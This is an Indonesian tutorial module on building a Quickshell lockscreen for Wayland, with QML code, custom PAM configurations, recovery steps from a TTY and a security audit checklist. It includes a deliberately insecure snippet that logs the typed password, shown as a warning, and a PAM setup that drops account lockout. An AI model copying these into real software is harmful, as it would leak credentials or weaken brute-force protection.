| **`color`** | `color` | Warna latar belakang. **Default: putih.** **Peringatan:** Warna transparan berperilaku aneh di beberapa sistem. Gunakan item berwarna di atas jendela transparan jika perlu, tetapi **jangan** membuat lockscreen transparan—kebanyakan compositor akan mengabaikannya, dan itu **tidak aman**. |
| **`width` / `height`** | `int` (readonly) | Dimensi permukaan. |
| **`contentItem`** | `Item` (readonly) | Item root untuk konten Anda (mis. `Column`, `TextInput`). |

**Mengapa `visible` tidak pernah menjadi `false`?** Karena `WlSessionLockSurface` **tidak bisa** "disembunyikan" selama sesi terkunci—itu akan melanggar tujuan keamanan. Satu-satunya cara permukaan hilang adalah **dihancurkan** (mis. saat sesi dibuka atau lock dihancurkan).

### 4.3 Kode Lengkap: Kerangka Lockscreen

Berikut adalah kode dari materi asli, dengan **penjelasan kata demi kata** yang jauh lebih rinci.

```qml
// lock/shell.qml — KERANGKA lockscreen. Uji di VM dengan TTY cadangan!
import Quickshell
import Quickshell.Io
import Quickshell.Wayland
import Quickshell.Services.Pam
import QtQuick

Scope {
    id: root
    property string currentText: ''
    property string statusText: ''

    PamContext {
        id: pam
        config: 'quickshell-lock'
        onPamMessage: { if (this.responseRequired) this.respond(root.currentText) }
        onCompleted: result => {
            root.currentText = ''
            if (result === PamResult.Success) sessionLock.locked = false
            else root.statusText = 'Gagal, coba lagi'
        }
    }

    WlSessionLock {
        id: sessionLock
        locked: false
        WlSessionLockSurface {
            color: 'black'
            Column {
                anchors.centerIn: parent
                TextInput {
                    echoMode: TextInput.Password
                    color: 'white'
                    focus: true
                    text: root.currentText
                    onTextEdited: root.currentText = text
                    onAccepted: { root.statusText = ''; pam.start() }
                }
                Text { text: root.statusText; color: 'tomato' }
            }
        }
    }

    IpcHandler { target: 'lock'; function engage(): void { sessionLock.locked = true } }
}
```

**Penjelasan baris demi baris:**

| Baris | Penjelasan |
|---|---|
| `import Quickshell` | Mengimpor tipe dasar Quickshell (mis. `Scope`, `IpcHandler`). |
| `import Quickshell.Io` | **Tidak digunakan secara langsung di kode ini**, tetapi merupakan kebiasaan baik untuk mengimpornya jika nanti Anda menambahkan `Process` (mis. untuk logging atau notifikasi). Dalam konteks lockscreen, impor ini bisa dihilangkan jika tidak diperlukan—tetapi tidak berbahaya. |
| `import Quickshell.Wayland` | Mengimpor `WlSessionLock` dan `WlSessionLockSurface`. **Wajib** untuk lockscreen. |
| `import Quickshell.Services.Pam` | Mengimpor `PamContext` dan `PamResult`. **Wajib** untuk autentikasi. |
| `import QtQuick` | Mengimpor tipe UI dasar: `Column`, `TextInput`, `Text`, `anchors`, dll. |
| `Scope { id: root ... }` | `Scope` adalah **kontainer logis** yang tidak memiliki tampilan visual. Ia berguna untuk mengelompokkan properti dan komponen. `id: root` memberikan nama agar bisa dirujuk dari dalam (mis. `root.currentText`). |
| `property string currentText: ''` | Properti untuk menyimpan **kata sandi saat ini** yang diketik pengguna. **Penting:** Properti ini harus **segera dikosongkan** setelah autentikasi (lihat `onCompleted`). |
| `property string statusText: ''` | Properti untuk menampilkan pesan status (mis. "Gagal, coba lagi"). |
| `PamContext { id: pam ... }` | Objek yang menghubungkan Quickshell ke PAM. `id: pam` memungkinkan referensi dari dalam handler. |
| `config: 'quickshell-lock'` | Menentukan **nama file konfigurasi PAM** yang akan digunakan. Quickshell akan mencari file ini di `/etc/pam.d/quickshell-lock`. Jika tidak ada, autentikasi akan gagal. **Mengapa tidak menggunakan `login` default?** Karena kita ingin **kebijakan lockscreen terpisah** dari login biasa (mis. mungkin kita tidak ingin `pam_faillock` mengunci akun setelah 3 percobaan salah—atau sebaliknya, kita ingin kebijakan yang lebih ketat). |
| `onPamMessage: { if (this.responseRequired) this.respond(root.currentText) }` | **Signal handler** yang dipanggil setiap kali PAM mengirim pesan. `this.responseRequired` adalah properti boolean yang menunjukkan apakah PAM **menunggu respons** (mis. kata sandi). Jika `true`, kita memanggil `this.respond(root.currentText)` untuk mengirim kata sandi yang diketik. **Mengapa `this`?** Dalam konteks signal handler QML, `this` merujuk ke objek `PamContext`. |
| `onCompleted: result => { ... }` | **Signal handler** yang dipanggil saat autentikasi selesai. `result` adalah `PamResult` (enum). |
| `root.currentText = ''` | **Langkah keamanan kritis:** Segera kosongkan kata sandi dari properti QML setelah autentikasi selesai (berhasil atau gagal). Ini mengurangi **umur kata sandi di memori**. |
| `if (result === PamResult.Success) sessionLock.locked = false` | Jika autentikasi berhasil, **buka kunci** dengan menyetel `locked = false`. Ini memberi tahu compositor untuk membuka sesi. |
| `else root.statusText = 'Gagal, coba lagi'` | Jika gagal, tampilkan pesan error. **Jangan** mengosongkan `statusText` sampai pengguna mencoba lagi. |
| `WlSessionLock { id: sessionLock ... }` | Objek utama lockscreen. `id: sessionLock` memungkinkan referensi dari `PamContext.onCompleted` (untuk membuka kunci). |
| `locked: false` | Status awal: **tidak terkunci**. Lockscreen baru aktif ketika `locked` disetel ke `true` (mis. melalui IPC `engage()`). **Mengapa tidak langsung `true`?** Karena kita ingin mengontrol **kapan** sesi dikunci (mis. setelah idle, atau melalui keybind). Jika shell ini adalah **lockscreen khusus** (bukan shell utama), Anda mungkin ingin `locked: true` agar langsung terkunci saat dijalankan. |
| `WlSessionLockSurface { color: 'black' ... }` | Permukaan lockscreen. `color: 'black'` memberikan latar belakang hitam (kontras dengan teks putih). **Jangan** menggunakan warna transparan—lihat peringatan di dokumentasi. |
| `Column { anchors.centerIn: parent ... }` | Tata letak vertikal yang **dipusatkan** di layar. `anchors.centerIn: parent` berarti kolom berada di tengah `WlSessionLockSurface`. |
| `TextInput { echoMode: TextInput.Password ... }` | Input teks untuk kata sandi. |
| `echoMode: TextInput.Password` | **Menyembunyikan** karakter yang diketik (menampilkan titik atau bintang). Ini mencegah **shoulder surfing** (orang di sebelah Anda melihat kata sandi). |
| `color: 'white'` | Warna teks putih agar terlihat di latar belakang hitam. |
| `focus: true` | **Wajib:** `TextInput` harus memiliki fokus keyboard agar pengguna bisa langsung mengetik. Tanpa ini, input tidak akan berfungsi. |
| `text: root.currentText` | **Binding dua arah** (secara konseptual): `TextInput` menampilkan `root.currentText`. Namun, karena kita juga menangani `onTextEdited`, ini lebih merupakan **sinkronisasi**. |
| `onTextEdited: root.currentText = text` | Setiap kali teks diubah, perbarui `root.currentText`. **Mengapa tidak menggunakan binding `text: root.currentText` saja?** Karena `TextInput` memiliki properti `text` yang dapat diubah oleh pengguna; binding dua arah di QML bisa rumit. Pendekatan ini lebih eksplisit dan aman. |
| `onAccepted: { root.statusText = ''; pam.start() }` | Dipanggil saat pengguna menekan **Enter**. `root.statusText = ''` menghapus pesan error sebelumnya. `pam.start()` **memulai** sesi autentikasi PAM. **Penting:** `start()` mengembalikan `bool`—jika `false`, sesi gagal dimulai (mis. karena PAM sedang sibuk). Anda bisa menambahkan penanganan error, tetapi untuk kerangka sederhana, ini cukup. |
| `Text { text: root.statusText; color: 'tomato' }` | Menampilkan pesan status (mis. error) dengan warna merah tomat. |
| `IpcHandler { target: 'lock'; function engage(): void { sessionLock.locked = true } }` | **IpcHandler** memungkinkan proses lain (mis. dari terminal atau keybind) memanggil fungsi `engage()` untuk **mengunci** sesi. `target: 'lock'` adalah nama target IPC; dari terminal, Anda akan menggunakan `qs -c lock ipc call lock engage`. |

### 4.4 Alternatif: Mengunci Langsung Saat Shell Dimulai

Jika shell Anda **khusus lockscreen** (bukan shell utama yang juga memiliki launcher), Anda mungkin ingin langsung terkunci saat Quickshell dijalankan:

```qml
WlSessionLock {
    id: sessionLock
    locked: true   // <-- Langsung terkunci
    // ...
}
```

**Konsekuensi:** Anda harus **membuka** kunci melalui autentikasi PAM. Tidak ada jalan lain. Ini adalah pilihan yang lebih aman untuk **lockscreen khusus**, karena tidak ada jendela "permulaan" yang bisa bocor.

---

## 5. `PamContext`: Siklus Autentikasi Langkah demi Langkah

### 5.1 Properti dan Fungsi Kunci

Berdasarkan dokumentasi resmi:

| Properti / Fungsi / Signal | Deskripsi |
|---|---|
| **`start() : bool`** | Memulai sesi autentikasi. Mengembalikan `true` jika berhasil dimulai. |
| **`abort() : void`** | Membatalkan sesi autentikasi yang sedang berjalan. |
| **`respond(response: string) : void`** | Mengirim respons ke PAM. **Hanya boleh dipanggil** jika `responseRequired = true`. |
| **`active : bool`** | Apakah PAM sedang melakukan autentikasi. Menyetel nilai ini sama dengan memanggil `start()` atau `abort()`. |
| **`message : string`** (readonly) | Pesan terakhir dari PAM. |
| **`messageIsError : bool`** (readonly) | Apakah pesan terakhir harus ditampilkan sebagai error. |
| **`responseRequired : bool`** (readonly) | Apakah PAM sedang menunggu respons. |
| **`responseVisible : bool`** (readonly) | Apakah respons pengguna harus terlihat (mis. untuk password, ini `false`). |
| **`config : string`** | Nama file konfigurasi PAM (default: `"login"`). |
| **`configDirectory : string`** | Direktori konfigurasi PAM (default: `/etc/pam.d`). |
| **`user : string`** | Pengguna yang akan diautentikasi. Jika tidak disetel, pengguna saat ini digunakan. |
| **`pamMessage()`** (signal) | Dipancarkan setiap kali PAM mengirim pesan baru (setelah `message`, `messageIsError`, dan `responseRequired` diperbarui). |
| **`completed(result: PamResult)`** (signal) | Dipancarkan saat autentikasi selesai. `result` bisa `Success`, `Failed`, atau `Error`. |

### 5.2 Alur Autentikasi Langkah demi Langkah

```text
[Pengguna menekan Enter]
         │
         ▼
pam.start()  ──►  PAM memulai percakapan
         │
         ▼
[PAM mengirim pesan: "Password:"]
         │
         ▼
signal pamMessage() dipancarkan
         │
         ▼
responseRequired = true
         │
         ▼
handler: this.respond(root.currentText)
         │
         ▼
PAM memverifikasi kata sandi
         │
         ├──► Berhasil: signal completed(PamResult.Success)
         │         │
         │         ▼
         │    sessionLock.locked = false
         │
         └──► Gagal: signal completed(PamResult.Failed)
                   │
                   ▼
              statusText = "Gagal, coba lagi"
```

**Poin penting:**
- **`pamMessage` bisa dipancarkan lebih dari sekali** dalam satu sesi autentikasi (mis. jika PAM meminta verifikasi tambahan, seperti kode OTP).
- **`responseRequired` adalah kunci.** Jangan pernah memanggil `respond()` jika `responseRequired = false`—itu akan menyebabkan error.
- **`completed` selalu dipancarkan**, bahkan jika terjadi error. Jika ada error internal PAM, `completed(PamResult.Error)` akan dipancarkan setelah `error()`.

### 5.3 `PamResult`: Enum Hasil Autentikasi

| Nilai | Arti |
|---|---|
| **`PamResult.Success`** | Autentikasi berhasil. Buka kunci. |
| **`PamResult.Failed`** | Autentikasi gagal (kata sandi salah). Tampilkan error, biarkan pengguna mencoba lagi. |
| **`PamResult.Error`** | Terjadi error internal (mis. PAM tidak dapat dihubungi, konfigurasi tidak valid). Tampilkan pesan error yang sesuai; **jangan** menganggap ini sebagai "kata sandi salah." |

---

## 6. Konfigurasi PAM Khusus Lockscreen: `/etc/pam.d/quickshell-lock`

### 6.1 Mengapa Tidak Menggunakan `login` Default?

Konfigurasi PAM default untuk `login` biasanya memuat **`system-auth`**, yang di Arch Linux **sudah memuat `pam_faillock`**. `pam_faillock` mengunci akun setelah **3 percobaan gagal dalam 15 menit**, selama **10 menit**.

**Mengapa ini masalah untuk lockscreen?**

- Jika Anda salah mengetik kata sandi 3 kali di lockscreen, akun Anda **terkunci selama 10 menit**—bahkan jika Anda kemudian mengetik kata sandi yang benar.
- Anda **tidak bisa** membuka lockscreen sampai lockout berakhir, **kecuali** Anda memiliki prosedur pemulihan (lihat Bagian 8).
- Ini bisa menjadi **denial of service** terhadap diri sendiri.

**Solusi:** Buat konfigurasi PAM **khusus** untuk lockscreen yang **tidak** memuat `pam_faillock`, atau yang memiliki kebijakan berbeda.

### 6.2 Konfigurasi Minimal

```text
# /etc/pam.d/quickshell-lock
auth     include  system-auth
account  include  system-auth
```

**Penjelasan kata demi kata:**
- `auth`: Tipe **autentikasi**—memverifikasi identitas pengguna.
- `include`: **Menyertakan** konfigurasi lain (dalam hal ini `system-auth`).
- `system-auth`: File konfigurasi PAM sistem standar, biasanya berisi `pam_unix.so` (password), `pam_faillock.so` (lockout), dll.
- `account`: Tipe **akun**—memeriksa apakah akun valid (mis. tidak kedaluwarsa).

**Risiko:** Konfigurasi ini **tetap memuat `pam_faillock`** melalui `system-auth`. Jika Anda ingin **menghindari** lockout di lockscreen, Anda perlu konfigurasi yang lebih eksplisit.

### 6.3 Konfigurasi Tanpa `pam_faillock` (Lebih Aman untuk Lockscreen)

```text
# /etc/pam.d/quickshell-lock
# Autentikasi hanya dengan password, TANPA faillock
auth     required  pam_unix.so
account  required  pam_unix.so
```

**Penjelasan:**
- `auth required pam_unix.so`: Memverifikasi kata sandi menggunakan `/etc/shadow`. `required` berarti modul ini **harus** berhasil; jika gagal, autentikasi gagal.
- **Tidak ada `pam_faillock`**—artinya pengguna bisa mencoba kata sandi **tanpa batas** di lockscreen. Ini **lebih aman** untuk pengalaman pengguna (tidak terkunci), tetapi **kurang aman** terhadap brute-force fisik. **Pilihan ada di tangan Anda.**

**Rekomendasi:** Untuk sebagian besar pengguna, **tanpa `pam_faillock`** di lockscreen adalah pilihan yang wajar, karena lockscreen biasanya berada di lingkungan fisik yang Anda kendalikan. Jika Anda paranoid terhadap brute-force fisik, pertahankan `pam_faillock` tetapi **siapkan prosedur pemulihan** (Bagian 8).

### 6.4 Konfigurasi dengan Fingerprint (Opsional)

Jika Anda memiliki pembaca sidik jari dan ingin menggunakannya:

```text
# /etc/pam.d/quickshell-lock
# Coba fingerprint dulu; jika gagal, fallback ke password
auth     sufficient  pam_fprintd.so
auth     required    pam_unix.so
account  required    pam_unix.so
```

**Penjelasan:**
- `sufficient`: Jika modul ini **berhasil**, autentikasi **langsung berhasil** dan aturan berikutnya **dilewati**. Jika **gagal**, aturan berikutnya tetap dijalankan.
- `pam_fprintd.so`: Modul untuk sidik jari (memerlukan `fprintd` terinstal dan sidik jari terdaftar).
- `required`: Jika `pam_fprintd` gagal, `pam_unix` **harus** berhasil untuk autentikasi.

**Alternatif:** Jika Anda ingin **keduanya** (fingerprint **dan** password), gunakan dua baris `required`:

```text
auth required pam_fprintd.so
auth required pam_unix.so
```

### 6.5 [TAMBAHAN] Konfigurasi PAM untuk Mengizinkan Urutan Apa Pun

Dokumentasi Quickshell menyarankan konfigurasi yang memungkinkan **password atau fingerprint dalam urutan apa pun**. Ini lebih kompleks dan memerlukan modul seperti `pam_exec` atau `pam_fprintd` dengan opsi tertentu. Untuk sebagian besar kasus, konfigurasi di atas sudah cukup.

---

## 7. Penanganan Kredensial: Umur di Memori, Pembersihan, dan Anti-Log

### 7.1 Prinsip: Kata Sandi Adalah Data Paling Sensitif

Kata sandi Anda adalah **kunci** ke seluruh sesi. Jika bocor, penyerang bisa mengakses **semua** yang Anda lindungi. Oleh karena itu:

1.  **Minimalkan umur di memori:** Kosongkan segera setelah digunakan.
2.  **Jangan pernah mencatat ke log:** `console.log()` atau `print()` **dilarang** untuk kata sandi.
3.  **Jangan pernah menyimpan ke disk:** Tidak ada `FileView` atau `Process` yang menulis kata sandi.
4.  **Hati-hati dengan swap:** Jika memori di-swap ke disk, kata sandi bisa tersimpan di sana. Gunakan **zram** atau **swap terenkripsi** jika Anda paranoid.

### 7.2 Implementasi Pembersihan di QML

Kode kita sudah melakukan:

```qml
onCompleted: result => {
    root.currentText = ''   // <-- pembersihan
    ...
}
```

**Mengapa ini penting?** `root.currentText` adalah properti QML yang menyimpan kata sandi. Setelah autentikasi selesai (berhasil atau gagal), kita **tidak membutuhkannya lagi**. Mengosongkannya mengurangi **jendela waktu** di mana kata sandi ada di memori.

**Apakah ini cukup?** Tidak sepenuhnya. QML/JavaScript menggunakan **garbage collection**—string lama mungkin masih ada di memori sampai GC berjalan. Namun, ini adalah **mitigasi terbaik yang tersedia** di tingkat QML. Untuk keamanan yang lebih tinggi, Anda perlu **memodifikasi Quickshell** (C++) untuk menggunakan `mlock()` dan menghapus memori secara eksplisit—di luar cakupan modul ini.

### 7.3 Anti-Log: Apa yang Tidak Boleh Dilakukan

**Jangan pernah** menulis kode seperti ini:

```qml
// ⚠️ JANGAN LAKUKAN INI
onPamMessage: {
    console.log("Password: " + root.currentText)  // <-- BOCOK!
    ...
}
```

`console.log()` akan menulis kata sandi ke **stderr**, yang bisa masuk ke **journal**, **log terminal**, atau **file log**. Ini adalah **pelanggaran keamanan serius**.

**Aturan:** Tidak ada logging kata sandi dalam bentuk apa pun. Jika Anda perlu debugging, log **bahwa** autentikasi dimulai/selesai, bukan **apa** kata sandinya.

---

## 8. Prosedur Pemulihan dan Pengujian di VM **[TAMBAHAN]**

### 8.1 Mengapa Prosedur Pemulihan Wajib Ada

Lockscreen yang fail-safe berarti: **jika ada yang salah, sesi tetap terkunci**. Jika Anda tidak memiliki prosedur pemulihan, Anda bisa **terkunci di luar sesi Anda sendiri**—secara permanen. Ini bukan teori; ini **pengalaman umum** bagi pengembang lockscreen.

**Aturan emas:** **Uji lockscreen hanya di VM** dengan **TTY cadangan** (mis. `Ctrl+Alt+F2`) yang dapat Anda akses.

### 8.2 Prosedur Pemulihan Standar

#### Langkah 1: Akses TTY

Tekan **`Ctrl+Alt+F2`** (atau `F3`, `F4`, dst.) untuk beralih ke TTY. Anda akan diminta login dengan nama pengguna dan kata sandi.

**Jika TTY juga terkunci:** Anda mungkin perlu **reboot paksa** (tahan tombol power). Ini adalah **jalan terakhir** dan dapat menyebabkan kehilangan data.

#### Langkah 2: Hentikan Quickshell

Setelah login di TTY:

```bash
# Cari PID Quickshell
pgrep -a quickshell

# Hentikan dengan SIGTERM (lebih baik daripada SIGKILL)
killall quickshell

# Jika tidak berhenti, gunakan SIGKILL
killall -9 quickshell
```

**Penjelasan:**
- `pgrep -a quickshell`: Mencari proses dengan nama `quickshell` dan menampilkan PID serta argumennya.
- `killall quickshell`: Mengirim `SIGTERM` ke semua proses `quickshell`. Ini memberi kesempatan proses untuk **membersihkan diri** (mis. membuka kunci jika masih memungkinkan).
- `killall -9 quickshell`: Mengirim `SIGKILL`—**paksa** mati. Proses **tidak bisa** membersihkan diri. **Gunakan hanya jika perlu.**

**Namun, ingat:** Jika Quickshell mati **tanpa** menyetel `locked = false`, compositor akan **tetap mengunci** sesi. Membunuh Quickshell **tidak** membuka kunci secara otomatis.

#### Langkah 3: Pulihkan Sesi Terkunci

Jika compositor tetap terkunci setelah Quickshell mati, Anda perlu **mengambil alih** sesi terkunci. Caranya tergantung compositor:

**Hyprland:** Aktifkan opsi `misc:allow_session_lock_restore`:

```bash
# Dari TTY, gunakan hyprctl
hyprctl keyword misc:allow_session_lock_restore 1

# Lalu jalankan ulang lockscreen
quickshell -c lock &
```

**Penjelasan:**
- `hyprctl keyword misc:allow_session_lock_restore 1`: Menyetel opsi agar Hyprland mengizinkan **klien lock baru** mengambil alih sesi terkunci. Default-nya `false`—artinya jika lockscreen crash, sesi **tetap terkunci secara permanen**.
- `quickshell -c lock &`: Menjalankan ulang lockscreen di latar belakang. Dengan opsi restore aktif, lockscreen baru akan **mengambil alih** dan Anda bisa membuka kunci.

**Catatan:** Pada versi Hyprland yang lebih baru, sintaks `hyprctl keyword` mungkin sudah **usang** (deprecated) dan diganti dengan `hyprctl eval`:

```bash
hyprctl --instance 0 eval 'hl.config({ misc = { allow_session_lock_restore = true } })'
hyprctl --instance 0 eval 'hl.dispatch(hl.dsp.exec_cmd("quickshell -c lock"))'
```

**Sway:** Sway memiliki kebijakan yang lebih ketat; jika lockscreen crash, Anda mungkin perlu **reboot**. Periksa dokumentasi Sway untuk opsi pemulihan.

### 8.3 [TAMBAHAN] Lupa Kata Sandi dan PAM Lockout

#### Skenario A: Lupa Kata Sandi (Tidak Ada Lockout)

Jika Anda menggunakan konfigurasi PAM **tanpa** `pam_faillock` (Bagian 6.3), Anda bisa mencoba kata sandi **tanpa batas**. Jika benar-benar lupa, Anda perlu **reset kata sandi** dari TTY:

```bash
# Dari TTY, login sebagai root (atau gunakan sudo)
passwd username
```

**Penjelasan:**
- `passwd username`: Mengubah kata sandi pengguna `username`. Anda akan diminta kata sandi baru dua kali.
- **Peringatan:** Ini memerlukan akses root. Jika Anda tidak memiliki akses root (mis. bukan sudoer), Anda **tidak bisa** mereset kata sandi tanpa reboot ke rescue mode.

#### Skenario B: `pam_faillock` Lockout

Jika Anda menggunakan `pam_faillock` dan salah mengetik 3 kali, akun Anda **terkunci selama 10 menit** (default). Selama lockout, **bahkan kata sandi yang benar pun ditolak**.

**Cara memeriksa lockout:**

```bash
# Dari TTY
faillock --user username
```

**Output contoh:**
```text
username:
When                Type  Source                                           Valid
2026-11-04 10:23:45 RHOST 192.168.1.100                                    V
2026-11-04 10:24:01 RHOST 192.168.1.100                                    V
2026-11-04 10:24:15 RHOST 192.168.1.100                                    V
```

**Penjelasan:**
- `When`: Waktu percobaan gagal.
- `Valid`: `V` berarti masih dihitung; `I` berarti tidak valid (mis. sudah kedaluwarsa).

**Cara membuka lockout:**

```bash
# Reset semua entri faillock untuk pengguna
faillock --user username --reset
```

**Penjelasan:**
- `faillock --user username --reset`: Menghapus **semua** catatan kegagalan untuk pengguna, sehingga lockout **berakhir segera**.
- **Perlu akses root** (atau sudo).

**Jika Anda tidak memiliki akses root:** Anda harus **menunggu** `unlock_time` (default 10 menit) atau **reboot**. Reboot akan menghapus entri faillock jika direktori tally berada di `/run` (yang biasanya di tmpfs dan hilang saat reboot).

**Mengubah kebijakan `unlock_time`:**

```bash
# /etc/security/faillock.conf
unlock_time = 300   # 5 menit
# atau
unlock_time = 0     # tidak pernah unlock otomatis (hati-hati!)
```

**Penjelasan:**
- `unlock_time = 300`: Setelah 5 menit, akses diizinkan kembali.
- `unlock_time = 0`: Lockout **permanen** sampai `faillock --reset` dijalankan. **Jangan gunakan ini** kecuali Anda memiliki prosedur pemulihan yang solid.

### 8.4 [TAMBAHAN] Menguji Lockscreen dengan Aman

**Checklist pengujian di VM:**

1.  **TTY cadangan:** Pastikan `Ctrl+Alt+F2` berfungsi **sebelum** mengunci.
2.  **Autentikasi berhasil:** Kunci sesi, ketik kata sandi yang benar, pastikan sesi terbuka.
3.  **Autentikasi gagal:** Kunci sesi, ketik kata sandi salah, pastikan pesan error muncul dan Anda bisa mencoba lagi.
4.  **Crash lockscreen:** Kunci sesi, lalu `kill -9` Quickshell. Pastikan sesi **tetap terkunci** (layar hitam/merah).
5.  **Pemulihan:** Dari TTY, ikuti prosedur di Bagian 8.2. Pastikan Anda bisa memulihkan sesi.
6.  **Multi-monitor:** Jika memiliki dua monitor, pastikan **keduanya** tertutup lockscreen. Coba cabut/colok monitor saat terkunci—`secure` harus tetap `true` hanya jika semua layar tertutup.

---

## 9. Audit Keamanan Lockscreen

### 9.1 Apa yang Harus Diaudit

| Aspek | Pertanyaan Audit | Cara Memeriksa |
|---|---|---|
| **Fail-safe** | Apakah sesi tetap terkunci jika lockscreen crash? | `kill -9` Quickshell saat terkunci; cek layar. |
| **Multi-monitor** | Apakah semua layar tertutup? | Kunci sesi; cek setiap monitor. Perhatikan properti `secure`. |
| **Kebocoran kata sandi di log** | Apakah kata sandi tercatat? | `journalctl --user -b | grep -i "password"`—**harus kosong**. |
| **Umur kata sandi di memori** | Apakah `currentText` dikosongkan? | Baca kode: pastikan `root.currentText = ''` di `onCompleted`. |
| **Konfigurasi PAM** | Apakah menggunakan `login` default? | `cat /etc/pam.d/quickshell-lock`. Jika tidak ada, Quickshell menggunakan `login`. |
| **Izin file PAM** | Apakah file PAM dapat dimodifikasi pengguna biasa? | `ls -l /etc/pam.d/quickshell-lock`—harus `root:root`, `644`. |
| **Akses TTY** | Apakah TTY cadangan berfungsi? | Tekan `Ctrl+Alt+F2` **sebelum** mengunci. |

### 9.2 Audit Log untuk Kebocoran

```bash
# Cari kata sandi di journal (harus kosong)
journalctl --user -b | grep -iE 'password|passwd|secret' | head

# Cari di log Quickshell (jika ada)
grep -iE 'password|passwd' ~/.local/state/quickshell/*/log/* 2>/dev/null
```

**Jika ada hasil:** Anda memiliki **kebocoran**. Hapus log, perbaiki kode, dan **ganti kata sandi** jika perlu.

---

## 10. Terminologi Esensial

| Istilah | Definisi |
|---|---|
| **PAM (Pluggable Authentication Modules)** | Kerangka autentikasi Linux yang memungkinkan aplikasi memverifikasi identitas pengguna melalui modul yang dapat dikonfigurasi. |
| **`ext-session-lock-v1`** | Protokol Wayland yang memungkinkan klien meminta compositor mengunci sesi; compositor yang menegakkan kunci, bukan klien. |
| **`WlSessionLock`** | Tipe Quickshell yang mengimplementasikan `ext-session-lock-v1`. |
| **`WlSessionLockSurface`** | Permukaan yang ditampilkan oleh `WlSessionLock` di setiap layar. |
| **Fail-safe** | Prinsip di mana kegagalan komponen **tidak** mengurangi keamanan; sistem tetap dalam keadaan aman (terkunci). |
| **`PamContext`** | Tipe Quickshell yang menghubungkan ke PAM untuk autentikasi. |
| **`PamResult`** | Enum hasil autentikasi: `Success`, `Failed`, `Error`. |
| **`pam_faillock`** | Modul PAM yang mengunci akun setelah sejumlah percobaan gagal. |
| **`faillock`** | Perintah untuk melihat dan mereset catatan `pam_faillock`. |
| **`allow_session_lock_restore`** | Opsi Hyprland yang mengizinkan klien lock baru mengambil alih sesi terkunci setelah crash. |
| **Shoulder surfing** | Serangan di mana penyerang melihat langsung apa yang Anda ketik; dicegah dengan `echoMode: TextInput.Password`. |

---

## 11. Visualisasi: Alur Lockscreen dan Fail-Safe

### 11.1 Alur Normal (Berhasil)

```text
[Pengguna menekan keybind "lock"]
         │
         ▼
IpcHandler.engage()  ──►  sessionLock.locked = true
         │
         ▼
Compositor menerima permintaan lock
         │
         ▼
WlSessionLock membuat WlSessionLockSurface untuk SETIAP layar
         │
         ▼
Compositor menahan input & tampilan klien lain
         │
         ▼
Pengguna mengetik kata sandi → Enter
         │
         ▼
pam.start()  ──►  PAM memverifikasi
         │
         ├──► Success: sessionLock.locked = false
         │         │
         │         ▼
         │    Compositor membuka kunci
         │
         └──► Failed: statusText = "Gagal"
                   │
                   ▼
              Pengguna mencoba lagi
```

### 11.2 Alur Fail-Safe (Crash)

```text
[Sesi terkunci, lockscreen aktif]
         │
         ▼
Quickshell CRASH (kill -9, bug, dll.)
         │
         ▼
WlSessionLock dihancurkan TANPA locked = false
         │
         ▼
Compositor: "Klien lock mati, tetapi saya TETAP mengunci sesi."
         │
         ▼
Layar menampilkan warna solid (hitam/merah)
         │
         ▼
[Sesi TIDAK terekspos—tetapi tidak bisa dioperasikan]
         │
         ▼
Pemulihan: TTY → kill quickshell → allow_session_lock_restore → jalankan ulang
```

---

## 12. Hubungan dengan Modul Lain

| Modul | Hubungan |
|---|---|
| **Modul 4.1 (Threat Model & Sandboxing)** | Threat model menentukan **aset** yang dilindungi lockscreen (kredensial, sesi). Sandboxing memastikan bahwa **proses pembantu** yang mungkin berinteraksi dengan lockscreen tidak bisa dieksploitasi. |
| **Modul 4.3 (Greetd & D-Bus Filtering)** | Greetd adalah **login manager** yang juga menggunakan PAM. Pola yang Anda pelajari di sini (konfigurasi PAM khusus, penanganan kredensial) berlaku untuk greetd. Penyaringan D-Bus memastikan bahwa **lockscreen tidak bisa dikendalikan** oleh proses yang tidak berwenang. |
| **Fase 1 (Instance Locking)** | `ShellId` (Modul 4.1) memastikan bahwa hanya **satu** instance lockscreen yang berjalan. `WlSessionLock` juga menegakkan "hanya satu lock pada satu waktu"—keduanya saling melengkapi. |
| **Fase 3 (IPC)** | `IpcHandler` digunakan untuk **memicu** lockscreen dari terminal atau keybind. Anda perlu memahami IPC untuk mengintegrasikan lockscreen dengan keybind compositor. |

---

## 13. Sumber Referensi

- **`WlSessionLock` (Quickshell docs):** [https://quickshell.org/docs/v0.3.2/types/Quickshell.Wayland/WlSessionLock/](https://quickshell.org/docs/v0.3.2/types/Quickshell.Wayland/WlSessionLock/)
- **`WlSessionLockSurface` (Quickshell docs):** [https://quickshell.org/docs/v0.3.2/types/Quickshell.Wayland/WlSessionLockSurface/](https://quickshell.org/docs/v0.3.2/types/Quickshell.Wayland/WlSessionLockSurface/)
- **`PamContext` (Quickshell docs):** [https://quickshell.org/docs/v0.3.1/types/Quickshell.Services.Pam/PamContext/](https://quickshell.org/docs/v0.3.1/types/Quickshell.Services.Pam/PamContext/)
- **Modul `Quickshell.Services.Pam` (termasuk struktur konfigurasi PAM):** [https://quickshell.org/docs/v0.3.1/types/Quickshell.Services.Pam/](https://quickshell.org/docs/v0.3.1/types/Quickshell.Services.Pam/)
- **`ext-session-lock-v1` (protokol Wayland):** [https://wayland.app/protocols/ext-session-lock-v1](https://wayland.app/protocols/ext-session-lock-v1)
- **`faillock.conf(5)` (manual PAM):** [https://manpages.debian.org/trixie/libpam-runtime/faillock.conf.5.en.html](https://manpages.debian.org/trixie/libpam-runtime/faillock.conf.5.en.html)
- **Hyprland Wiki — `allow_session_lock_restore`:** [https://wiki.hyprland.org/Configuring/Variables/](https://wiki.hyprland.org/Configuring/Variables/) (lihat bagian `misc`)
- **Linux-PAM:** [https://www.linux-pam.org/Linux-PAM-html/](https://www.linux-pam.org/Linux-PAM-html/)
- **Arch Wiki: Security (PAM dan faillock):** [https://wiki.archlinux.org/title/Security](https://wiki.archlinux.org/title/Security)

---

## 14. Tips dan Praktik Terbaik

- **Selalu uji di VM dengan TTY cadangan.** Jangan pernah menguji lockscreen pertama kali di sesi produksi Anda.
- **Gunakan konfigurasi PAM khusus.** Jangan mengandalkan `login` default; buat `/etc/pam.d/quickshell-lock` yang sesuai dengan kebutuhan Anda.
- **Kosongkan kata sandi segera setelah autentikasi.** `root.currentText = ''` adalah baris paling penting dalam kode Anda.
- **Jangan pernah log kata sandi.** Tidak ada `console.log`, tidak ada `print`, tidak ada `FileView` untuk kata sandi.
- **Aktifkan `allow_session_lock_restore` di Hyprland** (jika Anda menggunakan Hyprland) **sebelum** menguji, agar Anda tidak terkunci secara permanen.
